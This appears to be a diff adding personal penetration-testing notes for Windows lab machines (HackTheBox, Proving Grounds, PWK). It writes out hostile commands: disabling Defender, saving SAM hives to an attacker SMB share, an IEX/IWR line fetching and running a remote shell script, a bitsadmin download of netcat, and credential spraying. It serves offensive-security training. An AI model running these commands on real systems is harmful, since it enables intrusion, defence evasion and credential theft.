@@ -1,0 +1,49 @@
+
+	1. Transfer cmd.exe using nc64.exe rather than using PowerShell if not totally comfortable.
+	2. For IIS 6.0 use the "IIS 6.0 reverse shell script" from the Google. Microsoft IIS 6.0 was developed in 2003 which is super old. (Granny)
+	3. After gaining the initial foothold, If the HTTP file upload using wget, certutil, curl, IEX, etc. doesn't work, then try using smbserver.py or impacket-smbserver  (Granny)
+	4. The web.config file contains the main configuration of the system. So editing, uploading and executing that file may give the reverse connection back on our system.
+	In older versions of Windows IIS server, we could write an aspx one-liner reverse shell at the bottom of the web.config file and as we have IIS 7.5 running on the victim's system which is pretty old like 2008 or 2009, we can use that vulnerability to gain initial access on that of the system.
+	5. Always check "C:\Program Files (x86)" directory. Try to look for unknown applications/software e.g. mRemoteNG  (Bastion)
+	6. If "c:\users\harry" is access denied. Then also directly try to type the user flag "type c:\users\harry\desktop\user.txt". It may work.
+	7. LFI - If  /../../../../c:/users/nathan/desktop/passwords.txt doesn't work, try using /../../../../users/nathan/desktop/passwords.txt and so on.
+	8. Disable windows Antivirus/windows defender --->
+	Command  -->  powershell Set-MpPreference -DisableRealtimeMonitoring $true
+	9. Always check each and every user folder when you get an initial access to any user. Folders such as desktop, documents, downloads ,etc. Type --->  tree /f
+	10. Use chisel for port forwarding in windows. Plink doesn't work every time.
+	11. Before transferring the SAM and SYSTEM files. Save it to the registry first  -->  reg save HKLM\SAM c:\temp\SAM   OR     reg save HKLM\SAM \\10.10.14.3\kali\SAM  (using SMB server)  (Omni)
+	12. For IoT devices, we need to decrypt the files using Powershell command-line first like iot-admin.xml, user.txt and root.txt to be able to see the content inside it.  (Refer Omni HTB)
+	13. You can host an smb server with a username and password via smbserver.py, and mount them on the victim machine to easily save files from the victim machine to the attacker machine.
+	14. When a shell is gained, always check to see what profile you are executing commands under: echo %USERPROFILE%  if whoami doesn't exist.  Type  -->  dir env:
+	15. When Windows C:\ drive is given on FTP or SMB, try getting windows important files. Search windows LFI paths on Google.
+	16. If any file found on FTP, SMB or machine itself, search keyword "password" e.g. Configuration.old.bak  --->  strings Configuration.old.bak | grep -i password  
+	We can open .bak file but the above command was for the .exe or different file format.
+	17. IEX with IWR in powershell to get a shell. AV stop liking that old just IEX method. --->  IEX ( IWR http://10.10.14.11:8000/shell.ps1 -UseBasicParsing)
+	18. Always check folder or file permissions using icacls.
+	19. Plink can be used for port forwarding and winexe can be used for login using ssh. It works same as ssh. (In most of the cases I prefer chisel)
+	20. In winPEAS.exe --->  always look for the Linux shells/distributions such as - wsl.exe, bash.exe  --->  WSL (windows Subsystem for Linux)
+	If bash.exe is present, always check the bash_history file. Try to go inside the root directory. See is it permitted or not. The winPEAS.exe shows the Root Directory path.
+	21. Do not try to run any tools on evil-winrm because it is not that stable. Make use of RDP if available (port 3389). Or just send the cmd.exe on the netcat listener. (Secura PWK)
+	22. While transferring files through winrm, make use of its built-in functionality download and upload
+	23. If got a reverse shell using powershell payload, remember that it doesn't show an error messages and sometimes also doesn't show the outputs such as winpeas's output if the shell is too unstable. So it better to send cmd on other netcat listener to make it work properly.
+	24. One thing to remember that while spraying the creds using netexec try both with or without --local-auth tag.
+	Because here I did not get any match until I used --local-auth
+	 --local-auth will force NXC to try local accounts rather than the default domain joined accounts credentials.
+	25. If C:\Windows\Temp Doesn't work, try C:\\Users\\Public\\nc64.exe   (Jacko PG)
+	https://www.reddit.com/r/PowerShell/comments/1bp86kx/powershell_not_recognizing_whoami/?rdt=59120
+	26. Try full path:
+	--->   C:\Windows\System32\whoami.exe
+	--->   C:\Windows\System32\cmd.exe /c systeminfo
+	--->   C:\Windows\System32\whoami.exe /priv
+	Set the Path variable:
+	--->   echo %PATH%
+	--->   set PATH=C:\Windows\System32;C:\Windows
+	--->   echo %PATH%                        (Jacko PG)
+	27. Always check the high running ports and check what's inside the xampp folder. E.g. passwords.txt file and htdocs folder, etc.
+	If there is a xampp folder in the C:\ directory, so it is clear that something is running there. Either remotely or locally.
+	28. Even though SMB is access denied, always run enum4linux
+	Because here, I discovered the plain text password in the Description of the user.
+	29. Always check the c:\ directory carefully. I found Backup folder in C:\ directory and inside info.txt file it was written that the file TFTP.EXE runs every 5 minutes. So needed to change the file and got a reverse shell.
+	30. New file transfer method using bitsadmin:  --->  bitsadmin /transfer job /download /priority high http://192.168.245.139/nc.exe c:\\pwn\\nc.exe
+	31. FileZilla (FTP client) passwords are stored in the User's AppData directory in a file named recentservers.xml. 
+	
